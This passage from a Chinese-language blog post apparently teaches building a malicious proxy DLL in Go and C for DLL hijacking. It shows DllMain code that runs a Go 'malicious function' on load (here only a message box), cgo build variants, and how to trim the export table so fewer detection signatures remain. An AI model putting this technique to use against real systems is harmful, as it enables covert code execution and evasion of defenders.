</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;dllmain.h&#34;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> {
    HINSTANCE hinstDLL;  <span style=color:#75715e>// handle to DLL module
</span><span style=color:#75715e></span>    DWORD fdwReason;     <span style=color:#75715e>// reason for calling function // reserved
</span><span style=color:#75715e></span>    LPVOID lpReserved;   <span style=color:#75715e>// reserved
</span><span style=color:#75715e></span>} MyThreadParams;

DWORD WINAPI <span style=color:#a6e22e>MyThreadFunction</span>(LPVOID lpParam) {
    MyThreadParams params <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>((MyThreadParams<span style=color:#f92672>*</span>)lpParam);
    OnProcessAttach(params.hinstDLL, params.fdwReason, params.lpReserved);
    free(lpParam);
    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}

BOOL WINAPI <span style=color:#a6e22e>DllMain</span>(
    HINSTANCE _hinstDLL,  <span style=color:#75715e>// handle to DLL module
</span><span style=color:#75715e></span>    DWORD _fdwReason,     <span style=color:#75715e>// reason for calling function
</span><span style=color:#75715e></span>    LPVOID _lpReserved)   <span style=color:#75715e>// reserved
</span><span style=color:#75715e></span>{
    <span style=color:#66d9ef>switch</span> (_fdwReason) {
	<span style=color:#66d9ef>case</span> DLL_PROCESS_ATTACH:
		<span style=color:#75715e>// Initialize once for each new process.
</span><span style=color:#75715e></span>        <span style=color:#75715e>// Return FALSE to fail DLL load.
</span><span style=color:#75715e></span>        {
            MyThreadParams<span style=color:#f92672>*</span> lpThrdParam <span style=color:#f92672>=</span> (MyThreadParams<span style=color:#f92672>*</span>)malloc(<span style=color:#66d9ef>sizeof</span>(MyThreadParams));
            lpThrdParam<span style=color:#f92672>-&gt;</span>hinstDLL <span style=color:#f92672>=</span> _hinstDLL;
            lpThrdParam<span style=color:#f92672>-&gt;</span>fdwReason <span style=color:#f92672>=</span> _fdwReason;
            lpThrdParam<span style=color:#f92672>-&gt;</span>lpReserved <span style=color:#f92672>=</span> _lpReserved;
            HANDLE hThread <span style=color:#f92672>=</span> CreateThread(NULL, <span style=color:#ae81ff>0</span>, MyThreadFunction, lpThrdParam, <span style=color:#ae81ff>0</span>, NULL);
            <span style=color:#75715e>// CreateThread() because otherwise DllMain() is highly likely to deadlock.
</span><span style=color:#75715e></span>        }
        <span style=color:#66d9ef>break</span>;
    <span style=color:#66d9ef>case</span> DLL_PROCESS_DETACH:
        <span style=color:#75715e>// Perform any necessary cleanup.
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>break</span>;
    <span style=color:#66d9ef>case</span> DLL_THREAD_DETACH:
        <span style=color:#75715e>// Do thread-specific cleanup.
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>break</span>;
    <span style=color:#66d9ef>case</span> DLL_THREAD_ATTACH:
		<span style=color:#75715e>// Do thread-specific initialization.
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>break</span>;
    }
    <span style=color:#66d9ef>return</span> TRUE; <span style=color:#75715e>// Successful.
</span><span style=color:#75715e></span>}
</code></pre></td></tr></table>
</div>
</div><p>注意此处最好使用 <code>CreateThread</code> 来进行外部 Go 函数的调用，不然可能因为初始化 Go 运行时的问题导致死锁。</p>
<p>我们在该代码中 <code>DLL_PROCESS_ATTACH</code> 时异步调用了 OnProcessAttach，我们在 Golang 中实现这个恶意函数</p>
<h4 id=golang-恶意代码>Golang 恶意代码<a hidden class=anchor aria-hidden=true href=#golang-恶意代码>#</a></h4>
<p>我们现在来定义我们的恶意代码实现</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-golang data-lang=golang><span style=color:#f92672>package</span> <span style=color:#a6e22e>main</span>

<span style=color:#f92672>import</span> <span style=color:#e6db74>&#34;C&#34;</span>

<span style=color:#f92672>import</span> (
	<span style=color:#e6db74>&#34;unsafe&#34;</span>
	<span style=color:#e6db74>&#34;syscall&#34;</span>
)

<span style=color:#75715e>// MessageBox of Win32 API.
</span><span style=color:#75715e></span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>MessageBox</span>(<span style=color:#a6e22e>hwnd</span> <span style=color:#66d9ef>uintptr</span>, <span style=color:#a6e22e>caption</span>, <span style=color:#a6e22e>title</span> <span style=color:#66d9ef>string</span>, <span style=color:#a6e22e>flags</span> <span style=color:#66d9ef>uint</span>) <span style=color:#66d9ef>int</span> {
	<span style=color:#a6e22e>ret</span>, <span style=color:#a6e22e>_</span>, <span style=color:#a6e22e>_</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>syscall</span>.<span style=color:#a6e22e>NewLazyDLL</span>(<span style=color:#e6db74>&#34;user32.dll&#34;</span>).<span style=color:#a6e22e>NewProc</span>(<span style=color:#e6db74>&#34;MessageBoxW&#34;</span>).<span style=color:#a6e22e>Call</span>(
		uintptr(<span style=color:#a6e22e>hwnd</span>),
		uintptr(<span style=color:#a6e22e>unsafe</span>.<span style=color:#a6e22e>Pointer</span>(<span style=color:#a6e22e>syscall</span>.<span style=color:#a6e22e>StringToUTF16Ptr</span>(<span style=color:#a6e22e>caption</span>))),
		uintptr(<span style=color:#a6e22e>unsafe</span>.<span style=color:#a6e22e>Pointer</span>(<span style=color:#a6e22e>syscall</span>.<span style=color:#a6e22e>StringToUTF16Ptr</span>(<span style=color:#a6e22e>title</span>))),
		uintptr(<span style=color:#a6e22e>flags</span>))

	<span style=color:#66d9ef>return</span> int(<span style=color:#a6e22e>ret</span>)
}

<span style=color:#75715e>// MessageBoxPlain of Win32 API.
</span><span style=color:#75715e></span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>MessageBoxPlain</span>(<span style=color:#a6e22e>title</span>, <span style=color:#a6e22e>caption</span> <span style=color:#66d9ef>string</span>) <span style=color:#66d9ef>int</span> {
	<span style=color:#66d9ef>const</span> (
		<span style=color:#a6e22e>NULL</span>  = <span style=color:#ae81ff>0</span>
		<span style=color:#a6e22e>MB_OK</span> = <span style=color:#ae81ff>0</span>
	)
	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>MessageBox</span>(<span style=color:#a6e22e>NULL</span>, <span style=color:#a6e22e>caption</span>, <span style=color:#a6e22e>title</span>, <span style=color:#a6e22e>MB_OK</span>)
}

<span style=color:#75715e>// OnProcessAttach is an async callback (hook).
</span><span style=color:#75715e>//export OnProcessAttach
</span><span style=color:#75715e></span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>OnProcessAttach</span>(
	<span style=color:#a6e22e>hinstDLL</span> <span style=color:#a6e22e>unsafe</span>.<span style=color:#a6e22e>Pointer</span>, <span style=color:#75715e>// handle to DLL module
</span><span style=color:#75715e></span>	<span style=color:#a6e22e>fdwReason</span> <span style=color:#66d9ef>uint32</span>, <span style=color:#75715e>// reason for calling function
</span><span style=color:#75715e></span>	<span style=color:#a6e22e>lpReserved</span> <span style=color:#a6e22e>unsafe</span>.<span style=color:#a6e22e>Pointer</span>, <span style=color:#75715e>// reserved
</span><span style=color:#75715e></span>) {
	<span style=color:#a6e22e>MessageBoxPlain</span>(<span style=color:#e6db74>&#34;OnProcessAttach&#34;</span>, <span style=color:#e6db74>&#34;OnProcessAttach&#34;</span>)
}

<span style=color:#66d9ef>func</span> <span style=color:#a6e22e>main</span>() {
	<span style=color:#75715e>// Need a main function to make CGO compile package as C shared library
</span><span style=color:#75715e></span>}
</code></pre></td></tr></table>
</div>
</div><p>此处我们实现了恶意函数 <code>OnProcessAttach</code>，只是弹个窗来模拟恶意代码。</p>
<h4 id=组合-golang-和-c-编译>组合 Golang 和 c 编译<a hidden class=anchor aria-hidden=true href=#组合-golang-和-c-编译>#</a></h4>
<p>现在我们有了 .go 和 .c，还需要把它们两个粘合起来</p>
<h5 id=第一种方案>第一种方案<a hidden class=anchor aria-hidden=true href=#第一种方案>#</a></h5>
<p>你可以通过 cgo 的一般写法，在 .go 的注释中把 c 代码拷贝进去，例如</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-golang data-lang=golang><span style=color:#f92672>package</span> <span style=color:#a6e22e>main</span>

<span style=color:#75715e>/*
</span><span style=color:#75715e>#include &#34;dllmain.h&#34;
</span><span style=color:#75715e>
</span><span style=color:#75715e>typedef struct {
</span><span style=color:#75715e>    HINSTANCE hinstDLL;  // handle to DLL module
</span><span style=color:#75715e>    DWORD fdwReason;     // reason for calling function // reserved
</span><span style=color:#75715e>    LPVOID lpReserved;   // reserved
</span><span style=color:#75715e>} MyThreadParams;
</span><span style=color:#75715e>
</span><span style=color:#75715e>DWORD WINAPI MyThreadFunction(LPVOID lpParam) {
</span><span style=color:#75715e>    MyThreadParams params = *((MyThreadParams*)lpParam);
</span><span style=color:#75715e>    OnProcessAttach(params.hinstDLL, params.fdwReason, params.lpReserved);
</span><span style=color:#75715e>    free(lpParam);
</span><span style=color:#75715e>    return 0;
</span><span style=color:#75715e>}
</span><span style=color:#75715e>...c源码文件
</span><span style=color:#75715e>*/</span>

<span style=color:#f92672>import</span> <span style=color:#e6db74>&#34;C&#34;</span>

<span style=color:#f92672>import</span> (
	<span style=color:#e6db74>&#34;unsafe&#34;</span>
	<span style=color:#e6db74>&#34;syscall&#34;</span>
)

<span style=color:#75715e>// MessageBox of Win32 API.
</span><span style=color:#75715e></span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>MessageBox</span>(<span style=color:#a6e22e>hwnd</span> <span style=color:#66d9ef>uintptr</span>, <span style=color:#a6e22e>caption</span>, <span style=color:#a6e22e>title</span> <span style=color:#66d9ef>string</span>, <span style=color:#a6e22e>flags</span> <span style=color:#66d9ef>uint</span>) <span style=color:#66d9ef>int</span> {
	<span style=color:#a6e22e>ret</span>, <span style=color:#a6e22e>_</span>, <span style=color:#a6e22e>_</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>syscall</span>.<span style=color:#a6e22e>NewLazyDLL</span>(<span style=color:#e6db74>&#34;user32.dll&#34;</span>).<span style=color:#a6e22e>NewProc</span>(<span style=color:#e6db74>&#34;MessageBoxW&#34;</span>).<span style=color:#a6e22e>Call</span>(
		uintptr(<span style=color:#a6e22e>hwnd</span>),
		uintptr(<span style=color:#a6e22e>unsafe</span>.<span style=color:#a6e22e>Pointer</span>(<span style=color:#a6e22e>syscall</span>.<span style=color:#a6e22e>StringToUTF16Ptr</span>(<span style=color:#a6e22e>caption</span>))),
		uintptr(<span style=color:#a6e22e>unsafe</span>.<span style=color:#a6e22e>Pointer</span>(<span style=color:#a6e22e>syscall</span>.<span style=color:#a6e22e>StringToUTF16Ptr</span>(<span style=color:#a6e22e>title</span>))),
		uintptr(<span style=color:#a6e22e>flags</span>))

	<span style=color:#66d9ef>return</span> int(<span style=color:#a6e22e>ret</span>)
}
<span style=color:#f92672>...</span><span style=color:#66d9ef>go</span> <span style=color:#a6e22e>源码文件</span>
</code></pre></td></tr></table>
</div>
</div><h5 id=第二种方案>第二种方案<a hidden class=anchor aria-hidden=true href=#第二种方案>#</a></h5>
<p>或者你也可以给 .c 写一个头文件 .h，然后在 .go 中导入这个头文件，在 <code>go build</code> 的时候 Go 编译器会默认找到该目录下的 .c、.h、.go 一起编译。</p>
<p>比如你可以创建一个 .h 文件</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>OnProcessAttach</span>(HINSTANCE, DWORD, LPVOID);

BOOL WINAPI <span style=color:#a6e22e>DllMain</span>(
    HINSTANCE _hinstDLL,  <span style=color:#75715e>// handle to DLL module
</span><span style=color:#75715e></span>    DWORD _fdwReason,     <span style=color:#75715e>// reason for calling function
</span><span style=color:#75715e></span>    LPVOID _lpReserved    <span style=color:#75715e>// reserved
</span><span style=color:#75715e></span>);
</code></pre></td></tr></table>
</div>
</div><p>然后在 .go 中引用它</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-golang data-lang=golang><span style=color:#f92672>package</span> <span style=color:#a6e22e>main</span>

<span style=color:#75715e>/*
</span><span style=color:#75715e>#include &#34;dllmain.h&#34;
</span><span style=color:#75715e>*/</span>
<span style=color:#f92672>import</span> <span style=color:#e6db74>&#34;C&#34;</span>

<span style=color:#f92672>import</span> (
	<span style=color:#e6db74>&#34;unsafe&#34;</span>
	<span style=color:#e6db74>&#34;syscall&#34;</span>
)

<span style=color:#75715e>// MessageBox of Win32 API.
</span><span style=color:#75715e></span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>MessageBox</span>(<span style=color:#a6e22e>hwnd</span> <span style=color:#66d9ef>uintptr</span>, <span style=color:#a6e22e>caption</span>, <span style=color:#a6e22e>title</span> <span style=color:#66d9ef>string</span>, <span style=color:#a6e22e>flags</span> <span style=color:#66d9ef>uint</span>) <span style=color:#66d9ef>int</span> {
	<span style=color:#a6e22e>ret</span>, <span style=color:#a6e22e>_</span>, <span style=color:#a6e22e>_</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>syscall</span>.<span style=color:#a6e22e>NewLazyDLL</span>(<span style=color:#e6db74>&#34;user32.dll&#34;</span>).<span style=color:#a6e22e>NewProc</span>(<span style=color:#e6db74>&#34;MessageBoxW&#34;</span>).<span style=color:#a6e22e>Call</span>(
		uintptr(<span style=color:#a6e22e>hwnd</span>),
		uintptr(<span style=color:#a6e22e>unsafe</span>.<span style=color:#a6e22e>Pointer</span>(<span style=color:#a6e22e>syscall</span>.<span style=color:#a6e22e>StringToUTF16Ptr</span>(<span style=color:#a6e22e>caption</span>))),
		uintptr(<span style=color:#a6e22e>unsafe</span>.<span style=color:#a6e22e>Pointer</span>(<span style=color:#a6e22e>syscall</span>.<span style=color:#a6e22e>StringToUTF16Ptr</span>(<span style=color:#a6e22e>title</span>))),
		uintptr(<span style=color:#a6e22e>flags</span>))

	<span style=color:#66d9ef>return</span> int(<span style=color:#a6e22e>ret</span>)
}
</code></pre></td></tr></table>
</div>
</div><p>然后就可以一起编译了。</p>
<h3 id=导出表的问题>导出表的问题<a hidden class=anchor aria-hidden=true href=#导出表的问题>#</a></h3>
<p>确实，现在我们可以编译出恶意的转发dll了，但是我们可能会发现导出表里面其实有很多奇奇怪怪的导出函数</p>
<p><img loading=lazy src=https://raw.githubusercontents.com/akkuman/pic/master/pic/2021/8/c278d72c1e1a41bb88dac5bc8f8d7906.png alt="enter description here">
</p>
<p>这些导出函数可能会成为某些特征</p>
<p>我们的原始dll并没有这些导出函数，但是生成的转发dll这么多奇怪的导出函数该怎么去掉？</p>
<p>我们可以同样可以使用上文的 exp 文件来解决，它就是一个导出库文件，来定义有哪些导出的。</p>
<p>根据上文的方法我们使用 dlltool 从 def 文件生成一个 exp 文件，然后编译时加入链接即可。</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>go build -buildmode<span style=color:#f92672>=</span>c-shared -o add.dll -ldflags<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;-extldflags=-Wl,/home/lab/Repo/go-dll-proxy/dllmain/functions.exp -s -w&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p><code>ldflags</code> 里面的新增的 <code>-s -w</code> 只是为了减小一点体积去除一下符号，可选。</p>
<h2 id=最后的最后>最后的最后<a hidden class=anchor aria-hidden=true href=#最后的最后>#</a></h2>
<p>仓库相关示例已经上传至 <a href=https://github.com/akkuman/go-dll-evil>github.com/akkuman/go-dll-evil</a></p>
<p>感兴趣的可以查看。</p>
<div id=refer-anchor>
<h2 id=参考资料>参考资料<a hidden class=anchor aria-hidden=true href=#参考资料>#</a></h2>
<ul>
<li>[1] <a href=https://cloud.tencent.com/developer/article/1432448>PE知识复习之PE的导出表</a></li>
<li>[2] <a href=https://kevinalmansa.github.io/application%20security/DLL-Proxying/>DLL Proxying</a></li>
<li>[3] <a href="https://docs.microsoft.com/en-us/cpp/build/reference/export-exports-a-function?view=msvc-160">/EXPORT (Exports a Function)</a></li>
<li>[4] <a href=https://itm4n.github.io/dll-proxying/>Windows Privilege Escalation - DLL Proxying</a></li>
<li>[5] <a href=https://lucabarile.github.io/Blog/dll_hijacking_and_proxying/index.html>DLL Hijacking using DLL Proxying technique</a></li>
<li>[6] <a href=https://www.cnblogs.com/depend-wind/articles/11885131.html>DLL之def和exp文件作用</a></li>
<li>[7] <a href=https://wenku.baidu.com/view/4ba786cbb9f3f90f76c61bc0.html>mingw环境中使用dlltool工具来生成动态库的步骤</a></li>
<li>[8] <a href=https://stackoverflow.com/a/62360059/16654916>Specifying the DEF file when compiling a DLL with Clang</a></li>
<li>[9] <a href=https://github.com/golang/go/issues/20982>issues - cmd/link: support msvc object files</a></li>
<li>[10] <a href=https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html>gcc Options for Linking</a></li>
<li>[11] <a href=https://blog.filippo.io/rustgo/>RUSTGO: CALLING RUST FROM GO WITH NEAR-ZERO OVERHEAD</a></li>
<li>[12] <a href=https://docs.google.com/document/d/1nr-TQHw_er6GOQRsF6T43GGhFDelrAP0NqSS_00RgZQ/preview>Go Execution Modes</a></li>
<li>[13] <a href=https://pkg.go.dev/cmd/link>go tool link</a></li>
<li>[14] <a href=https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain>DllMain entry point</a></li>
<li>[15] <a href=https://www.geek-share.com/detail/2561615664.html>DllMain简介和DLL编写说明</a></li>
<li>[16] <a href=https://dev.to/mattn/call-go-function-from-c-function-1n3>Call Go function from C function</a></li>
